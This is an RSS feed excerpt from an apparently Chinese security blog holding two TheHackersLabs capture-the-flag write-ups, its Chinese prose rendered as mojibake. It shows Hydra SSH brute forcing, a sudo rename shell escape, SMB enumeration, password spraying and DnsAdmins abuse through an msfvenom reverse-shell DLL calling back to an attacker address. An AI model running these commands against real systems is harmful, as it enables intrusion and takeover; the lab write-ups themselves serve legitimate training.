Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 19:53:26
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://192.168.56.103:22/
[22][ssh] host: 192.168.56.103   login: debian   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 19:53:41
```

è¿›å…¥åèƒ½è¯»åˆ° `user.txt`

```bash
debian@OfusPingu:~$ cat flag.txt 
457xxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## æƒé™æå‡

`.bash_history` æ²¡åˆ æ‰ï¼Œä½†æ˜¯å†…å®¹è²Œä¼¼æ²¡æœ‰å¾ˆæœ‰ç”¨

```bash
debian@OfusPingu:~$ ls -la
total 36
drwx------ 4 debian debian 4096 Jun  7 12:09 .
drwxr-xr-x 3 root   root   4096 Jun  7 10:52 ..
-rw------- 1 debian debian  387 Jun  7 12:16 .bash_history
-rw-r--r-- 1 debian debian  220 Jun  7 10:52 .bash_logout
-rw-r--r-- 1 debian debian 3526 Jun  7 10:52 .bashrc
-rw-r--r-- 1 root   root     33 Jun  7 12:09 flag.txt
drwxr-xr-x 3 debian debian 4096 Jun  7 12:05 .local
drwxr-xr-x 4 root   root   4096 Jun  7 17:03 mi-web
-rw-r--r-- 1 debian debian  807 Jun  7 10:52 .profile

debian@OfusPingu:~$ cat .bash_history 
sudo -l
sudo /usr/bin/rename
sudo /usr/bin/rename -h
sudo /usr/bin/rename -m
exit
ls
cd mi-web/
ls
pwd
sudo su
sudo -l
sudo /usr/bin/rename
sudo /usr/bin/rename -m
grub-mkpasswd-pbkdf2
touch /etc/grub.d/01_password && chmod a+x /etc/grub.d/01_password
nano /etc/grub.d/01_password
sudo nano /etc/grub.d/01_password
sudo su
sudo -l
sudo /usr/bin/rename -m
sudo -l
sudo /usr/bin/rename -m
```

æŸ¥çœ‹ `sudo` æƒé™

```bash
debian@OfusPingu:~$ sudo -l
Matching Defaults entries for debian on OfusPingu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on OfusPingu:
    (ALL) NOPASSWD: /usr/bin/rename
```

ç»“æŸäº†ï¼Œè·Ÿç€`.bash_history` æ•² `sudo /usr/bin/rename -m` ä¼šè¿›å…¥å¸®åŠ©

![image.png](/post-images/TheHackersLabsOfusPingu/image5.png)

ç„¶åå¯ä»¥è¾“å…¥`esc` + `!/bin/bash` å³å¯åˆ‡æ¢åˆ° `root shell` ï¼Œè¿™é‡Œç±»ä¼¼äºä½¿ç”¨ `less` æˆ–è€… `more`ç­‰æ¥ææƒ

![image.png](/post-images/TheHackersLabsOfusPingu/image6.png)

è¯»å– `root.txt`

```bash
root@OfusPingu:~# cat root.txt 
D99xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>API</category>
            <category>rename</category>
            <category>hydra</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Doraemon]]></title>
            <link>https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon</guid>
            <pubDate>Sun, 03 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan æšä¸¾ SMB åŒ¿å æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹æœ‰è¯»çš„æƒé™ï¼Œé€šè¿‡æ¨¡å—å…¨éƒ¨è¯»å‡ºæ¥ å¾—åˆ°ä¸€ä¸ª txt æ–‡ä»¶ï¼Œå†…å®¹ï¼š è‡´ï¼šåŸƒæ–¯ç‰¹æ³¢çº³é“œé”£çƒ§1ç‰¹åˆ«ç»„ å“†å•¦Aæ¢¦ï¼šå˜¿ï¼Œä¼™è®¡ä»¬ï¼ä»Šå¤©æˆ‘ä»¬å»åƒé“œé”£çƒ§...]]></description>
            <content:encoded><![CDATA[
# Doraemon

> https://labs.thehackerslabs.com/machine/30
> 

![image.png](/post-images/TheHackersLabsDoraemon/image.png)

## Recon

### PortScan

```scheme
âœ  Doraemon nmap -sn 192.168.10.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:52 CST
Nmap scan report for 192.168.10.1
Host is up (0.00057s latency).
MAC Address: 0A:00:27:00:00:10 (Unknown)
Nmap scan report for 192.168.10.5
Host is up (0.00081s latency).
MAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.10.7
Host is up (0.00050s latency).
MAC Address: 08:00:27:34:2C:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.10.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.26 seconds
```

```scheme
âœ  Doraemon nmap -sT -min-rate 10000 -p- 192.168.10.5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST
Warning: 192.168.10.5 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.10.5
Host is up (0.00038s latency).
Not shown: 64597 closed tcp ports (conn-refused), 913 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49687/tcp open  unknown
49705/tcp open  unknown
MAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```scheme
âœ  Doraemon nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST
Nmap scan report for 192.168.10.5
Host is up (0.00049s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 08:53:47Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: DORAEMON)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: WIN-VRU3GG3DPLJ
|   NetBIOS computer name: WIN-VRU3GG3DPLJ\x00
|   Domain name: DORAEMON.THL
|   Forest name: DORAEMON.THL
|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL
|_  System time: 2025-08-03T10:53:48+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:09:13:ba (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-08-03T08:53:48
|_  start_date: 2025-08-03T08:25:53
|_clock-skew: mean: 5h19m54s, deviation: 1h09m16s, median: 5h59m54s

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.10.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds
```

### æšä¸¾

`SMB` åŒ¿å

```scheme
âœ  Doraemon nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 --shares         
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\anonymous: (Guest)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  -----           -----------     ------
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  gorrocoptero    READ            
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesiÃ³n 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesiÃ³n 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Users
```

æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹æœ‰è¯»çš„æƒé™ï¼Œé€šè¿‡æ¨¡å—å…¨éƒ¨è¯»å‡ºæ¥

```scheme
nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 -M spider_plus -o DOWNOAD_FLAG=True
```

![image.png](/post-images/TheHackersLabsDoraemon/image1.png)

å¾—åˆ°ä¸€ä¸ª `txt` æ–‡ä»¶ï¼Œå†…å®¹ï¼š

```scheme
âœ  gorrocoptero cat kedadawapa.txt       
AtenciÃ³n al grupo especial Dorayaki1 de Estepona

- Doraemon: Ã‚Â¡Hola, chicos! Ã‚Â¿QuÃƒÂ© les parece si vamos a comer dorayakis hoy?

- Nobita: Ã‚Â¡SÃƒÂ­! Ã‚Â¡Me encantan los dorayakis! PeroÃ¢â‚¬Â¦ Ã‚Â¿dÃƒÂ³nde vamos a conseguirlos?

- Shizuka: He oÃƒÂ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Ã‚Â¡Dicen que son los mejores de la ciudad!

- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Ã‚Â¡Espero que sean mÃƒÂ¡s grandes que los de la tienda anterior!

- Gigante: Ã‚Â¡Quiero que sean enormes! Ã‚Â¡Y que tengan mucho relleno! Si no, Ã‚Â¡no me importa ir!

- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃƒÂ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃƒÂ±o 3000.

- Nobita: Ã‚Â¡Espera! No sÃƒÂ© si deberÃƒÂ­a usar la mÃƒÂ¡quina. La ÃƒÂºltima vez que lo hice, terminÃƒÂ© en un lugar lleno de robots rarosÃ¢â‚¬Â¦

- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Ã‚Â¡Podemos ir a pie!

- Suneo: Eso suena aburrido. Ã‚Â¿Por quÃƒÂ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.

- Gigante: Ã‚Â¡Me encanta esa idea! Pero, Ã‚Â¡tendrÃƒÂ¡s que correr rÃƒÂ¡pido para ganarme, Suneo!

- Doraemon: Ã‚Â¿Y si mejor vamos todos juntos? AsÃƒÂ­ disfrutamos del camino. AdemÃƒÂ¡s, Ã‚Â¡puedo usar el futurÃƒÂ³fono para pedir un montÃƒÂ³n de dorayakis para que nos estÃƒÂ©n esperando!

- Nobita: Ã‚Â¡Esa es una gran idea, Doraemon! AsÃƒÂ­ no tengo que correr y me aseguro de que haya suficiente para todos.

- Shizuka: Ã‚Â¡Perfecto! Entonces, Ã‚Â¡vamos a la tienda de dorayakis!

- Suneo: Ã‚Â¡SÃƒÂ­! Ã‚Â¡Dorayakis, allÃƒÂ¡ vamos!

- Gigante: Ã‚Â¡No se olviden de mÃƒÂ­! Ã‚Â¡Voy a ganar!

- Doraemon: Ã‚Â¡A comer dorayakis!
```

> è‡´ï¼šåŸƒæ–¯ç‰¹æ³¢çº³é“œé”£çƒ§1ç‰¹åˆ«ç»„
> 
> 
> å“†å•¦Aæ¢¦ï¼šå˜¿ï¼Œä¼™è®¡ä»¬ï¼ä»Šå¤©æˆ‘ä»¬å»åƒé“œé”£çƒ§æ€ä¹ˆæ ·ï¼Ÿ
> 
> å¤§é›„ï¼šå¥½å•Šï¼æˆ‘è¶…çˆ±åƒé“œé”£çƒ§ï¼å¯æ˜¯â€¦â€¦æˆ‘ä»¬å»å“ªå„¿ä¹°å‘¢ï¼Ÿ
> 
> é™é¦™ï¼šæˆ‘å¬è¯´è¡—è§’å¼€äº†ä¸€å®¶æ–°çš„é“œé”£çƒ§åº—ã€‚æ®è¯´æ˜¯åŸé‡Œæœ€å¥½åƒçš„ï¼
> 
> å°å¤«ï¼šæ‹œæ‰˜ã€‚æ€»æ˜¯æœ‰æ–°ä¸œè¥¿ã€‚æˆ‘è¿«ä¸åŠå¾…æƒ³å°å°ã€‚å¸Œæœ›æ¯”ä¸Šä¸€å®¶çš„æ›´å¤§ï¼
> 
> å·¨äººï¼šæˆ‘æƒ³è¦ä¸ªå¤§å·çš„ï¼è€Œä¸”è¦å¤šé¦…å„¿ï¼å¦‚æœä¸æ˜¯ï¼Œæˆ‘ä¹Ÿå¯ä»¥å»ï¼
> 
> å“†å•¦Aæ¢¦ï¼šå¥½å§ï¼Œæˆ‘ä»¬å¯ä»¥è¯·å¤§é›„ç”¨æ—¶å…‰æœºçš„åŠ›é‡ï¼Œç©¿è¶Šåˆ°æœªæ¥ï¼Œç»™æˆ‘ä»¬å¸¦ä¸€äº›3000å¹´çš„é“œé”£çƒ§ã€‚
> 
> å¤§é›„ï¼šç­‰ç­‰ï¼æˆ‘ä¸çŸ¥é“è¯¥ä¸è¯¥ç”¨è¿™å°æœºå™¨ã€‚ä¸Šæ¬¡æˆ‘ç”¨çš„æ—¶å€™ï¼Œç»“æœæŠŠæˆ‘å¸¦åˆ°äº†ä¸€ä¸ªæ»¡æ˜¯å¥‡æ€ªæœºå™¨äººçš„åœ°æ–¹â€¦â€¦
> 
> é™é¦™ï¼šåˆ«æ‹…å¿ƒï¼Œå¤§é›„ã€‚æˆ‘ä»¬åªæ˜¯å»å•†åº—è€Œå·²ã€‚æˆ‘ä»¬ä¸ç”¨å»æœªæ¥ã€‚æˆ‘ä»¬å¯ä»¥æ­¥è¡Œï¼
> 
> å°å¤«ï¼šå¬èµ·æ¥å¾ˆæ— èŠã€‚ä¸å¦‚æˆ‘ä»¬æ¥ä¸ªæ¯”èµ›ï¼Ÿç¬¬ä¸€ä¸ªåˆ°åº—çš„äººå¯ä»¥é€‰æ‹©é“œé”£çƒ§çš„å£å‘³ã€‚
> 
> å·¨äººï¼šæˆ‘å–œæ¬¢è¿™ä¸ªä¸»æ„ï¼ä¸è¿‡ä½ å¾—è·‘å¾—å¿«æ‰èƒ½èµ¢æˆ‘ï¼Œå°å¤«ï¼
> 
> å“†å•¦Aæ¢¦ï¼šæˆ‘ä»¬ä¸€èµ·å»æ€ä¹ˆæ ·ï¼Ÿè¿™æ ·æˆ‘ä»¬å°±èƒ½äº«å—æ—…ç¨‹äº†ã€‚è€Œä¸”ï¼Œæˆ‘å¯ä»¥ç”¨æœªæ¥æ‰‹æœºè®¢ä¸€å †ç­‰ç€æˆ‘ä»¬çš„é“œé”£çƒ§ï¼
> 
> å¤§é›„ï¼šè¿™ä¸»æ„å¤ªæ£’äº†ï¼Œå“†å•¦Aæ¢¦ï¼è¿™æ ·æˆ‘å°±ä¸ç”¨è·‘äº†ï¼Œè¿˜èƒ½ç¡®ä¿æ¯ä¸ªäººéƒ½æœ‰è¶³å¤Ÿçš„é“œé”£çƒ§ã€‚
> 
> é™é¦™ï¼šå¤ªå¥½äº†ï¼é‚£æˆ‘ä»¬å»é“œé”£çƒ§åº—å§ï¼
> 
> å°å¤«ï¼šå¥½çš„ï¼é“œé”£çƒ§ï¼Œæ¥å•¦ï¼
> 
> å·¨äººï¼šåˆ«å¿˜äº†æˆ‘ï¼æˆ‘è¦èµ¢ï¼
> 
> â€”â€”å“†å•¦Aæ¢¦ï¼šæˆ‘ä»¬åƒé“œé”£çƒ§å§ï¼
> 

## æ¨ªå‘ç§»åŠ¨

### Timeroast âŒ

```scheme
âœ  Timeroast python timeroast.py 192.168.10.5
1000:$sntp-ms$6f6ee79d5defec4040b0f1bf4a84779e$1c0111e900000000000a0cff4c4f434cec399b9ba4dee858e1b8428bffbfcd0aec39acbe8d0ff10eec39acbe8d100f41
```

`hash` ä¿å­˜ä¸º `hash.txt` , `hashcat` çˆ†ç ´

```scheme
./hashcat.bin -m 31300 hash.txt /usr/share/wordlists/rockyou.txt 
```

æ²¡çˆ†ç ´å‡ºæ¥

### åŸŸç”¨æˆ·åæšä¸¾

å¯èƒ½å‰é¢çš„æ˜¯ç”¨æˆ·åï¼Œæˆ‘ä»¬å°†å…¶æå–å‡ºæ¥

```scheme
âœ  gorrocoptero cat kedadawapa.txt | awk -F '- ' '{print $2}' |awk -F ':' '{print $1}'| sort | uniq | tee Domain_users.txt

Doraemon
Gigante
Nobita
Shizuka
Suneo
```

æˆ‘ä»¬å†å¯¹ç”¨æˆ·åè¿›è¡Œæµ‹è¯•

```scheme
âœ  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p '' --smb-timeout 9999 --continue-on-success --loggedon-users
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\: 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Doraemon: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka: STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Suneo: STATUS_LOGON_FAILURE
```

æç¤º `STATUS_LOGON_FAILURE` å­˜åœ¨ç”¨æˆ·åï¼Œä½†æ˜¯å¯†ç é”™äº†

### **Kerberoast âŒ**

å†æšä¸¾ `Kerberoast`

```scheme
âœ  Doraemon GetNPUsers.py -dc-ip 192.168.10.5 doraemon.thl/ -usersfile Domain_users.txt              
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] invalid principal syntax
/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Gigante doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nobita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Suneo doesn't have UF_DONT_REQUIRE_PREAUTH set
```

æ²¡æ³•å­ï¼Œè¿™é‡Œçœ‹äº†ä¸€ä¸‹ `WP`ï¼Œå‘ç° txt æ–‡ä»¶ä¸­çš„ `Dorayaki1` æ˜¯ä¸€ä¸ªæœ‰æ•ˆå¯†ç 

### å¯†ç å–·æ´’

æˆ‘ä»¬è¿›è¡Œå¯†ç å–·æ´’

```scheme
âœ  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'Dorayaki1' --smb-timeout 9999 --continue-on-success                 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\:Dorayaki1 (Guest)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Suneo:Dorayaki1 STATUS_LOGON_FAILURE
```

å¾—åˆ°ç”¨æˆ· `Doraemon` çš„å‡­æ®

æµ‹è¯•å‡­æ®

```scheme
âœ  Doraemon nxc ldap 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'                           
LDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)
LDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 

âœ  Doraemon nxc winrm 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 (Pwn3d!)
```

### åŸŸåˆ†æ

ä½¿ç”¨ `bloodhound-ce-python` è¿›è¡Œä¿¡æ¯æ”¶é›†

```scheme
âœ  Doraemon bloodhound-ce-python -u 'Doraemon' -p 'Dorayaki1' -d 'DORAEMON.THL' -ns 192.168.10.5 -dc 'WIN-VRU3GG3DPLJ.DORAEMON.THL' --zip -c All
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: doraemon.thl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN-VRU3GG3DPLJ.DORAEMON.THL
INFO: Done in 00M 01S
INFO: Compressing output into 20250803115152_bloodhound.zip
```

åŸŸç”¨æˆ·ç»„ä¿¡æ¯

![image.png](/post-images/TheHackersLabsDoraemon/image2.png)

åœ¨ `Bloodhound` ä¸­æ²¡èƒ½æ‰¾åˆ°ä»€ä¹ˆå¯åˆ©ç”¨ä¿¡æ¯

ä¸Š `winpeas` èƒ½æ‰¾åˆ°ä¸€ä¸ªå¥‡æ€ªçš„æ–‡æœ¬æ–‡ä»¶

![image.png](/post-images/TheHackersLabsDoraemon/image3.png)

æ˜¯ä¸€ä¸ªå‡­æ®

```scheme
*Evil-WinRM* PS C:\> cat 'C:\Users\Doraemon\Links\Carta de amor a Shizuka.txt'
Shizuka te doy la clave de mi corazon: ShizukaTeAmobb12345
```

å¯†ç å–·æ´’

```scheme
âœ  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'ShizukaTeAmobb12345' --continue-on-success  
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\:ShizukaTeAmobb12345 (Guest)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Doraemon:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Suneo:ShizukaTeAmobb12345
```

æ˜¯ `suneo` çš„å‡­æ®ï¼Œå±äº `DNSADMINS` å’Œ `DORAYAKI` ç»„

![image.png](/post-images/TheHackersLabsDoraemon/image4.png)

é€šè¿‡ `BloodyAD` æŸ¥çœ‹å¯å†™ï¼Œæœ‰å¾ˆå¤š

![image.png](/post-images/TheHackersLabsDoraemon/image5.png)

## æƒé™æå‡

åœ¨ `HackTricks` ä¸­èƒ½æ‰¾åˆ°åˆ©ç”¨æ–¹æ³•ï¼šhttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins

**DnsAdmins**Â ç»„çš„æˆå‘˜å¯ä»¥åˆ©ç”¨å…¶æƒé™åœ¨ DNS æœåŠ¡å™¨ï¼ˆé€šå¸¸æ‰˜ç®¡åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼‰ä¸ŠåŠ è½½å…·æœ‰ SYSTEM æƒé™çš„ä»»æ„ `DLL`

ç”Ÿæˆåå¼¹ `shell` DLL

```scheme
âœ  Doraemon msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.100 LPORT=4444 -f dll -o OMG.dll                                                                                  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: OMG.dll
```

ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä½¿ `DNS` æœåŠ¡å™¨åŠ è½½ä»»æ„ `DLL`

```scheme
*Evil-WinRM* PS C:\tools> dnscmd WIN-VRU3GG3DPLJ.DORAEMON.THL /config /serverlevelplugindll c:\tools\OMG.dll

Propiedad del Registro serverlevelplugindll restablecida correctamente.
Comando completado correctamente.
```

ç„¶åé‡å¯æœåŠ¡

```scheme
sc.exe \\WIN-VRU3GG3DPLJ stop dns
sc.exe \\WIN-VRU3GG3DPLJ start dns
```

![image.png](/post-images/TheHackersLabsDoraemon/image6.png)

è¯»å– `root.txt` å’Œ `user.txt`

```powershell
C:\Users\Administrador\Desktop>type root.txt
type root.txt
advcrxxxxxxxxxxxxxxxxxxxxxxxxxx

C:\Users\Suneo\Desktop>type user.txt
type user.txt
asfrexxxxxxxxxxxxxxxxxxx

C:\Users\Administrador\Desktop>whoami
whoami
nt authority\system
```

## æ€»ç»“

è¿˜è¡Œï¼Œå°±ä¸€å¼€å§‹çš„å¯†ç æ²¡çŒœåˆ°]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>DNSADmins</category>
            <category>SMB</category>
